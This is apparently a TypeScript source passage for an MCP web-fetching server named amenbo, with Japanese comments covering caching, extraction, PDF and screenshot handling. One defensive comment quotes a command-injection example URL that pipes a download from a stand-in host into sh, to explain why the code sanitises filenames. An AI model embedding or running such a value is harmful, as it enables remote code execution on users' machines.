#!/usr/bin/env node
/**
 * server.ts — amenbo MCP stdioサーバー。
 *
 * ツール(3個で確定。plan.md §3-6のツール数最小化方針):
 *   - fetch: politeness → cache(fresh/revalidated/unchanged/diff/miss) → 二段フェッチ
 *     → J4 pruning・J7アダプタ・J8バナー除去 込みのMarkdown抽出 → mode別出力
 *     (markdown/outline/section/screenshot)。PDFはURL判定で別経路。
 *   - links: sitemap/RSS優先のリンク列挙。
 *   - screenshot: 明示的な視覚確認用のタイル分割スクリーンショット。
 */
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";
import { computeScreenshotCacheKey, PageCache, type CacheStatus, type ScreenshotCacheStatus } from "./cache.js";
import { diffMarkdown, type SectionDiff } from "./diff.js";
import { AmenboError, SectionNotFoundError } from "./errors.js";
import { detectDataSources } from "./extract/dataSources.js";
import { extractMarkdown, type ExtractionMethod } from "./extract/markdown.js";
import { buildOutline, extractSection, type OutlineResult } from "./extract/outline.js";
import { DEFAULT_PDF_MAX_BYTES, extractPdfText, looksLikePdf, markdownFromPdfText, renderPdfPages } from "./extract/pdf.js";
import { buildHandoffPreview } from "./extract/preview.js";
import { evaluateQuality } from "./extract/qualityScore.js";
import { closeBrowser } from "./fetcher/browser.js";
import { fetchPage, type FetchTier, type HandoffResult } from "./fetcher/index.js";
import { assertHttpScheme, httpGetBinary, resolveDefaultMaxBodyBytes } from "./fetcher/http.js";
import { discoverLinks, type LinksResult } from "./links.js";
import { PolitenessManager } from "./politeness.js";
import { captureTiledScreenshot, DEFAULT_TILE_WIDTH } from "./screenshot.js";
import { computeBlockHashes, removeTemplateBlocks } from "./templateLearning.js";
import { paginateMarkdown, type PaginatedResult } from "./tokens.js";

/** N1: package.jsonのversionを読み込む(以前はここに"0.3.0"を直書きしておりpackage.json(0.1.0)と不整合だった)。 */
function resolvePackageVersion(): string {
  const fallback = "0.0.0";
  try {
    const packageJsonPath = join(dirname(fileURLToPath(import.meta.url)), "..", "package.json");
    const parsed = JSON.parse(readFileSync(packageJsonPath, "utf-8")) as { version?: unknown };
    return typeof parsed.version === "string" ? parsed.version : fallback;
  } catch (error) {
    console.error("package.jsonからバージョンを読み込めませんでした:", error);
    return fallback;
  }
}

/** キャッシュTTL(ミリ秒)。運用/検証時の調整用に環境変数で上書きできる(既定はcache.tsの15分)。 */
function resolveCacheTtlMs(): number | undefined {
  const raw = process.env.AMENBO_CACHE_TTL_MS;
  if (!raw) return undefined;
  const parsed = Number(raw);
  return Number.isFinite(parsed) && parsed > 0 ? parsed : undefined;
}

const cacheTtlMs = resolveCacheTtlMs();
const politeness = new PolitenessManager();
const cache = new PageCache(cacheTtlMs !== undefined ? { ttlMs: cacheTtlMs } : {});

// M2: cache.close()は同期処理なので'exit'イベント(非同期処理を待てない)内でも安全に呼べる。
// 一方でSIGINT/SIGTERMはブラウザのクリーンアップ(非同期)を待ってから明示的にprocess.exit()する
// 必要がある(fetcher/browser.tsのregisterCleanupHandlersと同様の理由。あちらは
// getBrowser()が一度も呼ばれない=chromium未起動のセッションではリスナー登録自体が行われない
// ため、ここでサーバー起点の終了処理として独立して登録しておく)。
process.once("exit", () => {
  cache.close();
});
process.once("SIGINT", () => {
  void closeBrowser().finally(() => process.exit(0));
});
process.once("SIGTERM", () => {
  void closeBrowser().finally(() => process.exit(0));
});

const DEFAULT_MAX_TOKENS = 8000;
const DEFAULT_PAGE = 1;
const DEFAULT_SCREENSHOT_SCALE = 1.0;

/** URLのhostnameを安全に取り出す(不正URLならnull)。Phase 4テンプレート学習のドメインキーに使う。 */
function safeHostname(url: string): string | null {
  try {
    return new URL(url).hostname;
  } catch {
    return null;
  }
}

type ExtendedFetchTier = FetchTier | "cache";

/** サーバー側が304を受け取ったがキャッシュが存在しない、という到達しないはずの異常系。 */
class UnexpectedNotModifiedError extends AmenboError {
  readonly code = "UNEXPECTED_NOT_MODIFIED";
  constructor(url: string) {
    super(`キャッシュが存在しないのにNot Modified(304)が返されました: ${url}`);
  }
}

interface ExtractedPage {
  status: "fetched";
  markdown: string;
  title: string | null;
  finalUrl: string;
  tier: FetchTier;
  etag: string | null;
  lastModified: string | null;
  lowQuality: boolean;
  qualityReason: string | null;
  prunedBlockCount: number;
  adapterName: string | null;
  extractionMethod: ExtractionMethod;
  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
  dataSourceHints: string[];
}

type FetchAndExtractResult = { status: "not_modified" } | { status: "handoff"; handoff: HandoffResult } | ExtractedPage;

/** URLとselectorの組から、新規取得・変換したMarkdownと品質スコア/pruning/アダプタ/ジオメトリ結果を作る。 */
async function fetchAndExtract(
  url: string,
  selector: string | undefined,
  conditionalHeaders: Record<string, string> | undefined,
): Promise<FetchAndExtractResult> {
  const fetchResult = await fetchPage(url, conditionalHeaders ? { headers: conditionalHeaders } : {});
  if ("notModified" in fetchResult) {
    return { status: "not_modified" };
  }
  // 機能B: HTML/PDF以外のコンテンツはハンドオフ応答(メタデータ+プレビュー+curl誘導)の対象。
  // Markdown抽出・品質判定・キャッシュ保存は行わない。
  if ("handoff" in fetchResult) {
    return { status: "handoff", handoff: fetchResult };
  }

  let extracted = extractMarkdown(fetchResult.html, {
    url: fetchResult.finalUrl,
    ...(selector ? { selector } : {}),
    geometry: fetchResult.geometry,
  });
  let finalFetchResult = fetchResult;

  // Phase 4 ジオメトリ抽出: HTTP tierでReadability/アダプタ双方が失敗した(body-fallback)場合、
  // 二段フェッチのSPA判定に該当しなくても、ジオメトリ(bounding box)を得る目的だけで
  // ブラウザへ再エスカレーションする。div soup/テーブルレイアウトの古い個人/中小企業サイト
  // 対策の本命(plan.md §6 Phase4)。selector指定時はユーザーが本文位置を明示済みなので行わない。
  // ジオメトリでも改善しなかった場合はHTTP tierの結果(body-fallback)をそのまま使う。
  if (!selector && fetchResult.tier === "http" && extracted.extractionMethod === "body-fallback") {
    try {
      await politeness.waitTurn(url); // 追加のブラウザ遷移が発生するため、律速のため再度順番を待つ
      const browserFetchResult = await fetchPage(url, { forceBrowser: true });
      if (!("notModified" in browserFetchResult) && !("handoff" in browserFetchResult)) {
        const browserExtracted = extractMarkdown(browserFetchResult.html, { url: browserFetchResult.finalUrl, geometry: browserFetchResult.geometry });
        if (browserExtracted.extractionMethod === "geometry") {
          extracted = browserExtracted;
          finalFetchResult = browserFetchResult;
        }
      }
    } catch {
      // 再エスカレーションに失敗してもHTTP tierの結果(body-fallback)をそのまま使う(ベストエフォート)
    }
  }

  const quality = evaluateQuality(extracted.qualityInput);

  // 機能C: 最終的に採用したfetch結果(HTTP tier、またはジオメトリ再エスカレーション成功時は
  // browser tier)のHTMLからページ内の構造化データリンクを検出する。screenshotモードへの
  // 自動切替(mode:auto)はこの後server.ts側で判定されるため、ここでは常に計算しておき
  // (検出ゼロならトークン増ゼロ)、screenshot応答側では単に参照しない。
  const dataSourceHints = detectDataSources(finalFetchResult.html, finalFetchResult.finalUrl);

  return {
    status: "fetched",
    markdown: extracted.markdown,
    title: extracted.title,
    finalUrl: finalFetchResult.finalUrl,
    tier: finalFetchResult.tier,
    etag: finalFetchResult.etag,
    lastModified: finalFetchResult.lastModified,
    lowQuality: quality.lowQuality,
    qualityReason: quality.reason,
    prunedBlockCount: extracted.prunedBlockCount,
    adapterName: extracted.adapterName,
    extractionMethod: extracted.extractionMethod,
    dataSourceHints,
  };
}

interface ResolvedPage {
  title: string | null;
  finalUrl: string;
  tier: ExtendedFetchTier;
  cacheStatus: CacheStatus;
  markdown: string;
  lowQuality: boolean;
  qualityReason: string | null;
  prunedBlockCount: number;
  adapterName: string | null;
  extractionMethod: ExtractionMethod;
  /** 新規フェッチ(cacheStatus==='miss')の場合のみ、上書き前の旧キャッシュ内容(§3-3差分応答用)。 */
  previousMarkdown: string | null;
  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
  dataSourceHints: string[];
}

/** 機能B: 非HTMLコンテンツはMarkdown化・キャッシュ対象外のため、ResolvedPageとは別枝で扱う。 */
type ResolvePageResult = ResolvedPage | { kind: "handoff"; handoff: HandoffResult };

function pageFromCacheEntry(url: string, cached: ReturnType<PageCache["get"]>, cacheStatus: CacheStatus): ResolvedPage {
  const metadata = cached?.metadata ?? {};
  const dataSourceHints = Array.isArray(metadata.dataSourceHints) ? (metadata.dataSourceHints as string[]) : [];
  return {
    title: (metadata.title as string | null) ?? null,
    finalUrl: (metadata.finalUrl as string | undefined) ?? url,
    tier: "cache",
    cacheStatus,
    markdown: cached?.markdown ?? "",
    lowQuality: Boolean(metadata.lowQuality),
    qualityReason: (metadata.qualityReason as string | null) ?? null,
    prunedBlockCount: Number(metadata.prunedBlockCount ?? 0),
    adapterName: (metadata.adapterName as string | null) ?? null,
    extractionMethod: (metadata.extractionMethod as ExtractionMethod | undefined) ?? "readability",
    previousMarkdown: null,
    dataSourceHints,
  };
}

/**
 * URL(+selector)からMarkdownを解決する。selector指定時はURL単位のキャッシュを使わない
 * (同一URLでも抽出結果がselector毎に変わるため)。品質スコア/アダプタ判定結果もキャッシュ
 * メタデータへ保存し、'fresh'なキャッシュ応答時にも再フェッチ無しでmode:autoの判定を再現する。
 * 機能B: 非HTMLコンテンツ(ハンドオフ対象)を取得した場合は { kind: "handoff" } を返す。
 */
async function resolvePage(url: string, selector: string | undefined): Promise<ResolvePageResult> {
  if (selector) {
    const result = await fetchAndExtract(url, selector, undefined);
    if (result.status === "not_modified") {
      throw new UnexpectedNotModifiedError(url);
    }
    if (result.status === "handoff") {
      return { kind: "handoff", handoff: result.handoff };
    }
    return {
      title: result.title,
      finalUrl: result.finalUrl,
      tier: result.tier,
      cacheStatus: "miss",
      markdown: result.markdown,
      lowQuality: result.lowQuality,
      qualityReason: result.qualityReason,
      prunedBlockCount: result.prunedBlockCount,
      adapterName: result.adapterName,
      extractionMethod: result.extractionMethod,
      previousMarkdown: null,
      dataSourceHints: result.dataSourceHints,
    };
  }

  const cached = cache.get(url);
  if (cached && cache.isFresh(cached)) {
    return pageFromCacheEntry(url, cached, "fresh");
  }

  const conditionalHeaders: Record<string, string> = {};
  if (cached?.etag) conditionalHeaders["If-None-Match"] = cached.etag;
  if (cached?.lastModified) conditionalHeaders["If-Modified-Since"] = cached.lastModified;

  const result = await fetchAndExtract(url, undefined, Object.keys(conditionalHeaders).length > 0 ? conditionalHeaders : undefined);

  if (result.status === "not_modified") {
    if (!cached) throw new UnexpectedNotModifiedError(url);
    cache.touch(url);
    return pageFromCacheEntry(url, cached, "revalidated");
  }

  if (result.status === "handoff") {
    return { kind: "handoff", handoff: result.handoff };
  }

  const previousMarkdown = cached?.markdown ?? null;

  // Phase 4 テンプレート学習: このページの(除去前・全)ブロックハッシュをドメイン別に記録する。
  // selector指定時(このブランチには来ない)は記録しない(選択範囲が偏り学習を汚すため)。
  const domain = safeHostname(result.finalUrl);
  if (domain) {
    cache.recordDomainPageBlocks(domain, url, computeBlockHashes(result.markdown));
  }

  cache.set({
    url,
    etag: result.etag,
    lastModified: result.lastModified,
    markdown: result.markdown,
    metadata: {
      title: result.title,
      finalUrl: result.finalUrl,
      tier: result.tier,
      lowQuality: result.lowQuality,
      qualityReason: result.qualityReason,
      prunedBlockCount: result.prunedBlockCount,
      adapterName: result.adapterName,
      extractionMethod: result.extractionMethod,
      dataSourceHints: result.dataSourceHints,
    },
  });

  return {
    title: result.title,
    finalUrl: result.finalUrl,
    tier: result.tier,
    cacheStatus: "miss",
    markdown: result.markdown,
    lowQuality: result.lowQuality,
    qualityReason: result.qualityReason,
    prunedBlockCount: result.prunedBlockCount,
    adapterName: result.adapterName,
    extractionMethod: result.extractionMethod,
    previousMarkdown,
    dataSourceHints: result.dataSourceHints,
  };
}

// ---- スクリーンショット解決(fetch toolのscreenshot自動切替/screenshotツール共通) ----

interface ScreenshotTileData {
  data: Buffer;
}

interface ResolvedScreenshot {
  finalUrl: string;
  tiles: ScreenshotTileData[];
  cacheStatus: ScreenshotCacheStatus;
  pageWidth: number;
  pageHeight: number;
  /** N7: MAX_TILES切り捨てが発生していた場合true。 */
  truncated: boolean;
}

interface ResolveScreenshotOptions {
  fullPage: boolean;
  width: number;
  scale: number;
}

/**
 * M4: キャッシュ済みタイルのPNGファイルが(手動削除・M3のTTL掃除の競合等で)欠損している場合、
 * 生のENOENTを伝播させず null を返してcache miss扱い(再撮影)へフォールバックする。
 */
function readCachedTiles(tilePaths: string[]): ScreenshotTileData[] | null {
  try {
    return tilePaths.map((filePath) => ({ data: readFileSync(filePath) }));
  } catch (error) {
    const isEnoent = error instanceof Error && "code" in error && (error as NodeJS.ErrnoException).code === "ENOENT";
    if (isEnoent) return null;
    throw error;
  }
}

async function resolveScreenshot(url: string, options: ResolveScreenshotOptions): Promise<ResolvedScreenshot> {
  // 公開品質バグ修正: robots.txt取得(politeness.guard)やブラウザ起動より前にスキームを検証する。
  // file:等を先に弾かないと、politeness側が origin("null"等)からrobots URLを組み立てる際に
  // 壊れたURLになり、生のTypeErrorがstderrに漏れてしまう(guardPublicAddress自体は
  // このあとcaptureTiledScreenshot内のnavigateSafelyでも検証するが、それより前段で
  // クリーンな型付きエラーとして早期に弾く)。
  assertHttpScheme(url);
  // 実URLへの独立したブラウザ遷移が発生するため、markdown抽出時とは別にpolitenessの順番待ちを行う
  await politeness.guard(url);

  const cacheKey = computeScreenshotCacheKey(url, options.width, options.scale, options.fullPage);
  const cached = cache.getScreenshot(cacheKey);
  if (cached && cache.isFresh(cached)) {
    const tiles = readCachedTiles(cached.tilePaths);
    if (tiles) {
      return {
        finalUrl: cached.url,
        tiles,
        cacheStatus: "fresh",
        pageWidth: Number(cached.metadata.pageWidth ?? 0),
        pageHeight: Number(cached.metadata.pageHeight ?? 0),
        truncated: Boolean(cached.metadata.truncated),
      };
    }
    // PNGファイル欠損: キャッシュmiss扱いで下の再撮影へフォールスルーする
  }

  const captured = await captureTiledScreenshot(url, options);
  cache.setScreenshot({
    cacheKey,
    url: captured.finalUrl,
    tiles: captured.tiles.map((tile) => tile.png),
    metadata: { pageWidth: captured.pageWidth, pageHeight: captured.pageHeight, truncated: captured.truncated },
  });

  return {
    finalUrl: captured.finalUrl,
    tiles: captured.tiles.map((tile) => ({ data: tile.png })),
    cacheStatus: "miss",
    pageWidth: captured.pageWidth,
    pageHeight: captured.pageHeight,
    truncated: captured.truncated,
  };
}

// ---- 応答フォーマット ----

type TextBlock = { type: "text"; text: string };
type ImageBlock = { type: "image"; data: string; mimeType: string };

function adapterLine(adapterName: string | null): string[] {
  return adapterName ? [`adapter: ${adapterName}`] : [];
}

/**
 * 抽出経路の注記。"readability"(既定の成功経路)/"adapter"(adapter:行と重複するため省略)/
 * "selector"(ユーザー指定なので自明)は表示せず、Phase 4の "geometry" と、
 * 品質が疑わしい "body-fallback" のみユーザーへ明示する(トークン節約)。
 */
function extractionMethodLine(method: ExtractionMethod): string[] {
  return method === "geometry" || method === "body-fallback" ? [`extraction: ${method}`] : [];
}

/** Phase 4: テンプレート学習で除去した定型ブロック数(0件なら表示しない。トークン節約)。 */
function templateRemovedLine(templateRemovedCount: number): string[] {
  return templateRemovedCount > 0 ? [`template_blocks_removed: ${templateRemovedCount}`] : [];
}

/** N6: 単一ブロックがmax_tokens予算を超過し、分割できずそのまま返した場合のみ明示する。 */
function budgetExceededLine(paginated: PaginatedResult): string[] {
  return paginated.exceededBudget ? [`budget_exceeded: true(単一ブロックがmax_tokensを超過しています)`] : [];
}

/** 機能C: 構造化データリンクのヒント(検出ゼロなら空文字=トークン増ゼロ)。 */
export function dataSourcesSection(hints: string[]): string {
  return hints.length > 0 ? `\n\ndata_sources:\n${hints.join("\n")}` : "";
}

function formatMarkdownResponse(page: ResolvedPage, paginated: PaginatedResult, sectionId: string | null, templateRemovedCount: number): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    ...(sectionId ? [`section: ${sectionId}`] : []),
    `cache: ${page.cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: ${page.tier}`,
    `pruned_blocks: ${page.prunedBlockCount}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}${dataSourcesSection(page.dataSourceHints)}`;
}

/** §3-3 差分応答: 本文ハッシュ一致(約10トークンの短文応答)。 */
function formatUnchangedResponse(page: ResolvedPage): string {
  return [`url: ${page.finalUrl}`, `mode_used: markdown`, `cache: unchanged`].join("\n");
}

function formatSectionDiffBlock(diff: SectionDiff): string {
  const label = diff.type === "added" ? "追加" : diff.type === "removed" ? "削除" : "変更";
  if (diff.type === "removed") {
    return `${"#".repeat(diff.level)} ${diff.heading} [${label}]`;
  }
  const lines = diff.content.split("\n");
  if (lines.length > 0 && /^#{1,6}\s/.test(lines[0] ?? "")) {
    lines[0] = `${lines[0]} [${label}]`;
    return lines.join("\n");
  }
  return `${"#".repeat(diff.level)} ${diff.heading} [${label}]\n\n${diff.content}`;
}

/** §3-3 差分応答: 変更・追加・削除された節のみ返却。 */
function formatDiffResponse(page: ResolvedPage, sections: SectionDiff[], templateRemovedCount: number): string {
  const counts = { added: 0, changed: 0, removed: 0 };
  for (const section of sections) counts[section.type]++;

  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: markdown`,
    `cache: diff`,
    `changed_sections: ${sections.length}(追加${counts.added}/変更${counts.changed}/削除${counts.removed})`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  return `${header}\n\n${sections.map(formatSectionDiffBlock).join("\n\n")}${dataSourcesSection(page.dataSourceHints)}`;
}

function formatOutlineResponse(page: ResolvedPage, outline: OutlineResult, templateRemovedCount: number): string {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${page.finalUrl}`,
    `mode_used: outline`,
    `cache: ${page.cacheStatus}`,
    `total_tokens: ${outline.totalTokens}`,
    `fetch_tier: ${page.tier}`,
    ...adapterLine(page.adapterName),
    ...extractionMethodLine(page.extractionMethod),
    ...templateRemovedLine(templateRemovedCount),
  ].join("\n");

  const body =
    outline.sections
      .map((section) => `${"  ".repeat(section.level - 1)}- [${section.id}] ${"#".repeat(section.level)} ${section.heading} — ${section.excerpt} (~${section.tokens} tok)`)
      .join("\n") || "(見出しが見つかりませんでした。mode: markdown で全文を取得してください)";

  return `${header}\n\n${body}`;
}

export function buildScreenshotContent(
  page: { title: string | null },
  screenshot: ResolvedScreenshot,
  reason: string | null,
): Array<TextBlock | ImageBlock> {
  const header = [
    `title: ${page.title ?? "(なし)"}`,
    `url: ${screenshot.finalUrl}`,
    `mode_used: screenshot`,
    `cache: ${screenshot.cacheStatus}`,
    `reason: ${reason ?? "明示的にscreenshotが指定されました"}`,
    `tiles: ${screenshot.tiles.length}`,
    `page_size: ${screenshot.pageWidth}x${screenshot.pageHeight}`,
    `fetch_tier: browser`,
    // N7: MAX_TILES切り捨てが発生した場合のみ明示する(トークン節約)
    ...(screenshot.truncated ? [`truncated: true(MAX_TILES枚を超えるため切り捨てました)`] : []),
  ].join("\n");

  return [
    { type: "text", text: header },
    ...screenshot.tiles.map((tile) => ({ type: "image" as const, data: tile.data.toString("base64"), mimeType: "image/png" })),
  ];
}

function formatLinksResponse(url: string, result: LinksResult): string {
  const header = [`url: ${url}`, `source: ${result.source}`, `count: ${result.links.length}${result.truncated ? " (truncated)" : ""}`].join("\n");
  const body = result.links.map((link) => (link.title ? `- ${link.title} — ${link.url}` : `- ${link.url}`)).join("\n");
  return `${header}\n\n${body || "(リンクが見つかりませんでした)"}`;
}

// ---- 機能B: 非HTMLコンテンツのハンドオフ応答 ----

/**
 * URLのパス末尾からファイル名を推測する(curl -o のデフォルト値用)。取れなければ"download"。
 *
 * セキュリティ修正(CWE-78): WHATWG URLパーサは `'` `;` `|` `$` `` ` `` 等のパス中の文字を
 * パーセントエンコードしないため、攻撃者が細工したURL(例: `/$(curl evil.example|sh).csv`)経由で
 * このファイル名がそのままシェルコマンド文字列(hint行)に混入し、コマンドインジェクションが
 * 成立しうる。curlに渡す提案コマンドの一部として安全に提示できるよう、英数字・`.`・`-`・`_`
 * 以外は全て `_` に置換する。
 */
export function guessFilename(url: string): string {
  const rawBase = (() => {
    try {
      const pathname = new URL(url).pathname;
      return pathname.split("/").filter((segment) => segment.length > 0).pop() ?? "";
    } catch {
      return "";
    }
  })();
  const sanitized = rawBase.replace(/[^A-Za-z0-9._-]/g, "_");
  return sanitized.length > 0 ? sanitized : "download";
}

/**
 * シェルの単一引用符コンテキストへ値を安全に埋め込む(CWE-78対策)。
 * 単一引用符内では `'` 以外は解釈されないため、`'` のみ「引用符を閉じ、
 * エスケープ済み`'`を1つ挿入し、再び引用符を開く」(`'\''`)という定石で表現する。
 */
export function shellQuoteSingle(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

/**
 * 機能B: HTML/PDF以外のコンテンツタイプを「行き止まり」のエラーではなく、
 * メタデータ+プレビュー+curl誘導の正常応答として整形する。
 * ファイル全体がAMENBO_MAX_BODY_BYTESを超える場合(Content-Length既知時)は
 * プレビュー自体を省略し、メタデータ+誘導のみを返す。
 */
export function formatHandoffResponse(handoff: HandoffResult, maxTokens: number): string {
  const filename = guessFilename(handoff.finalUrl);
  const sizeKnown = handoff.declaredSize !== null;
  const sizeLabel = sizeKnown ? `${handoff.declaredSize}` : `${handoff.bytes.length}(取得分。Content-Lengthヘッダ無し)`;
  const oversized = sizeKnown && (handoff.declaredSize as number) > resolveDefaultMaxBodyBytes();

  const header = [
    `content_type: ${handoff.contentType ?? "(不明)"}`,
    `size: ${sizeLabel}`,
    `url: ${handoff.finalUrl}`,
    `mode_used: handoff`,
  ].join("\n");

  const preview = oversized ? null : buildHandoffPreview(handoff.bytes, handoff.contentType, maxTokens, handoff.truncated);
  const previewBlock = preview ? `\n\n${preview.body}${preview.note ? `\n\n(${preview.note})` : ""}` : "";

  const hint = `\n\nhint: このファイルはamenboの本文抽出対象外です。全体の取得は curl -L -o ${filename} ${shellQuoteSingle(handoff.finalUrl)} を推奨します`;

  return `${header}${previewBlock}${hint}`;
}

// ---- PDF対応(URL判定で独立経路。mode/selector/section等は適用しない) ----

function formatPdfTextResponse(title: string | null, finalUrl: string, cacheStatus: "fresh" | "miss", pdfPageCount: number, paginated: PaginatedResult): string {
  const header = [
    `title: ${title ?? "(なし)"}`,
    `url: ${finalUrl}`,
    `mode_used: markdown`,
    `cache: ${cacheStatus}`,
    `tokens: ${paginated.tokens}`,
    `page: ${paginated.page} of ${paginated.totalPages}`,
    `fetch_tier: pdf`,
    `pdf_pages: ${pdfPageCount}`,
    ...budgetExceededLine(paginated),
  ].join("\n");
  return `${header}\n\n${paginated.content}`;
}

/** PDFはキャッシュ層(§3-3等)を流用しつつ独立した経路で扱う。テキスト層があればMarkdown、無ければ画像タイル。 */
async function handlePdfFetch(url: string, page: number, maxTokens: number): Promise<Array<TextBlock | ImageBlock>> {
  const cached = cache.get(url);
  if (cached && cache.isFresh(cached)) {
    const paginated = paginateMarkdown(cached.markdown, maxTokens, page);
    const title = (cached.metadata.title as string | null) ?? null;
    const finalUrl = (cached.metadata.finalUrl as string | undefined) ?? url;
    const pdfPageCount = Number(cached.metadata.pdfPageCount ?? 0);
    return [{ type: "text", text: formatPdfTextResponse(title, finalUrl, "fresh", pdfPageCount, paginated) }];
  }

  const binary = await httpGetBinary(url, { maxBytes: DEFAULT_PDF_MAX_BYTES });
  const textResult = await extractPdfText(binary.bytes);

  if (textResult.hasTextLayer) {
    const markdown = markdownFromPdfText(textResult);
    cache.set({
      url,
      etag: binary.headers.get("etag"),
      lastModified: binary.headers.get("last-modified"),
      markdown,
      metadata: { title: textResult.title, finalUrl: binary.finalUrl, pdfPageCount: textResult.pageCount },
    });
    const paginated = paginateMarkdown(markdown, maxTokens, page);
    return [{ type: "text", text: formatPdfTextResponse(textResult.title, binary.finalUrl, "miss", textResult.pageCount, paginated) }];
  }

  // テキスト層が実質無い(スキャンPDF): 先頭ページから画像タイルとして返す(キャッシュ非対象)
  const images = await renderPdfPages(binary.bytes);
  const header = [
    `title: ${textResult.title ?? "(なし)"}`,
    `url: ${binary.finalUrl}`,
    `mode_used: screenshot`,
    `cache: miss`,
    `reason: PDFにテキスト層がありません(スキャンPDFの可能性。全${textResult.pageCount}ページ中先頭${images.length}ページを画像化)`,
    `tiles: ${images.length}`,
    `fetch_tier: pdf`,
  ].join("\n");
  return [
    { type: "text", text: header },
    ...images.map((image) => ({ type: "image" as const, data: image.png.toString("base64"), mimeType: "image/png" })),
  ];
}

// ---- fetchツール ----

interface FetchToolInput {
  url: string;
  mode?: "auto" | "markdown" | "outline" | "screenshot" | undefined;
  selector?: string | undefined;
  section?: string | undefined;
  page?: number | undefined;
  max_tokens?: number | undefined;
  force_full?: boolean | undefined;
}

async function handleFetchTool(input: FetchToolInput): Promise<Array<TextBlock | ImageBlock>> {
  const mode = input.mode ?? "auto";
  const page = input.page ?? DEFAULT_PAGE;
  const maxTokens = input.max_tokens ?? DEFAULT_MAX_TOKENS;
  // 公開品質バグ修正: robots.txt取得(politeness.guard)より前にスキームを検証する(理由は
  // resolveScreenshotのコメント参照)。zodの.url()はスキームを制限しないため、ここでの
  // 検証が実質的な最初の関門になる。
  assertHttpScheme(input.url);
  await politeness.guard(input.url);

  if (looksLikePdf(input.url, null)) {
    return handlePdfFetch(input.url, page, maxTokens);
  }

  const resolvedOrHandoff = await resolvePage(input.url, input.selector);

  // 機能B: 非HTMLコンテンツはMarkdown抽出・キャッシュ・mode/selector/section等を適用せず、
  // メタデータ+プレビュー+curl誘導のハンドオフ応答を返す(PDFのURL判定と同様の独立経路)。
  if ("kind" in resolvedOrHandoff) {
    return [{ type: "text", text: formatHandoffResponse(resolvedOrHandoff.handoff, maxTokens) }];
  }
  const resolved = resolvedOrHandoff;

  // Phase 4 テンプレート学習: 定型ブロック(ヘッダ/フッタ/定型ナビ等)を表示直前に除去する。
  // force_fullで無効化できる。selector指定時はページ全体ではなく特定要素の抽出結果なので対象外。
  const domain = safeHostname(resolved.finalUrl);
  const templateHashes = !input.force_full && !input.selector && domain ? cache.getTemplateBlockHashes(domain) : new Set<string>();
  const { markdown: displayMarkdown, removedCount: templateRemovedCount } = removeTemplateBlocks(resolved.markdown, templateHashes);
  const previousDisplayMarkdown =
    resolved.previousMarkdown !== null ? removeTemplateBlocks(resolved.previousMarkdown, templateHashes).markdown : null;
  const view: ResolvedPage = { ...resolved, markdown: displayMarkdown, previousMarkdown: previousDisplayMarkdown };

  // sectionが指定された場合は、mode指定に関わらずその節のMarkdownのみを返す(差分応答は適用しない)
  if (input.section) {
    const sectionMarkdown = extractSection(view.markdown, input.section);
    if (sectionMarkdown === null) {
      throw new SectionNotFoundError(input.url, input.section);
    }
    const paginated = paginateMarkdown(sectionMarkdown, maxTokens, page);
    return [{ type: "text", text: formatMarkdownResponse(view, paginated, input.section, templateRemovedCount) }];
  }

  if (mode === "outline") {
    const outline = buildOutline(view.markdown);
    return [{ type: "text", text: formatOutlineResponse(view, outline, templateRemovedCount) }];
  }

  const wantsScreenshot = mode === "screenshot" || (mode === "auto" && resolved.lowQuality);
  if (wantsScreenshot) {
    const screenshot = await resolveScreenshot(resolved.finalUrl, {
      fullPage: true,
      width: DEFAULT_TILE_WIDTH,
      scale: DEFAULT_SCREENSHOT_SCALE,
    });
    return buildScreenshotContent(resolved, screenshot, mode === "screenshot" ? null : resolved.qualityReason);
  }

  // §3-3 差分応答: selector無し・force_full無し・新規フェッチ(cacheStatus==='miss')かつ旧キャッシュがある場合のみ
  // 比較にはview(テンプレート除去後)を使う。定型ブロックの有無で誤って差分検知しないようにするため。
  const diffEligible = !input.selector && !input.force_full && resolved.cacheStatus === "miss" && view.previousMarkdown !== null;
  if (diffEligible) {
    if (view.previousMarkdown === view.markdown) {
      return [{ type: "text", text: formatUnchangedResponse(view) }];
    }
    const diff = diffMarkdown(view.previousMarkdown ?? "", view.markdown);
    if (diff.sections.length > 0 && !diff.allSectionsChanged) {
      return [{ type: "text", text: formatDiffResponse(view, diff.sections, templateRemovedCount) }];
    }
    // 全節変更、または差分検出不能な場合は通常の全文応答へフォールバックする
  }

  const paginated = paginateMarkdown(view.markdown, maxTokens, page);
  return [{ type: "text", text: formatMarkdownResponse(view, paginated, null, templateRemovedCount) }];
}

// ---- MCPサーバー本体 ----

const server = new McpServer({ name: "amenbo", version: resolvePackageVersion() });

server.registerTool(
  "fetch",
  {
    title: "Fetch a web page as Markdown",
    description:
      "日本語Webページを低負荷・省トークンで取得(robots.txt/レート制御/キャッシュ内蔵)。" +
      "mode: auto(既定,品質スコアでMarkdown/screenshot自動切替)/markdown/outline(見出し要約)/screenshot。" +
      "再取得時はcache: unchanged(無変更)/diff(変更節のみ)で省トークン応答。PDFはURLで自動判定。",
    inputSchema: {
      url: z.string().url().describe("取得対象URL(http/httpsのみ。PDFも可)"),
      mode: z.enum(["auto", "markdown", "outline", "screenshot"]).optional().describe("既定auto"),
      selector: z.string().optional().describe("本文を絞り込むCSSセレクタ"),
      section: z.string().optional().describe("outlineで得たsection ID。指定時はその節のMarkdownのみ返す"),
      page: z.number().int().positive().optional().describe("ページ番号(既定1)"),
